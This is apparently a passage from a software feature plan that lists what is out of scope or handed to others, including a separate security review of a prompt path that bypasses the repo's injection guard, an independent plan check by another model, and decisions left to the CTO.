- **Security review** — a separate agent, and it **should** be run. This feature adds a prompt-assembly path that deliberately bypasses `assemblePrompt` and therefore the repo's shared `INJECTION_GUARD`, and it is the first feature in this product that invites a human to paste a model-adjacent string into a shell. R5, R16, A15 and A16 are the plan's answer; an independent reviewer should confirm it.
- **`plan-verifier`** — this plan goes to a model of a different family for an independent read before execution.
- **Deciding the audit's assumptions.** Every row marked "assumed as" — notably Q8's no-safety-factor ceiling and Q4's unchanged default — is a human's to overturn. The implementer executes them as written and does not re-litigate them inside a phase.
- **Whether the spec changes.** The audit rows and every *Recommendation* are `specreator`'s and the CTO's business. A spec revision is a new numbered file, never an edit.
- **Adding `OPENROUTER_API_KEY` to `~/.devdigest/secrets.json`, or changing the registered default model.** A CTO action informed by J1.
- **Any change to `repo-intel`'s indexing, `SUPPORTED_EXT`, or `getBlastRadius`'s one-hop reach** (N5, N6).
- **`mcp/`** — no tour tool, and the token budget it must stay under is a separate decision.
- **A retention policy** for accumulated `onboarding_tours` rows, and the fate of the dead `onboarding` table. Both are cleanup, not this feature.
- **Error boundaries in the client.** `client/INSIGHTS.md:386+` records it as an open question with an explicit "do not scatter per-component boundaries as a first move". `MermaidDiagram`'s existing `null` return and B2's defensive payload handling are the local mitigations.
- **Recording the insights at the end** is *in* scope — it is Phase J2, and `CLAUDE.md` says do not skip it.
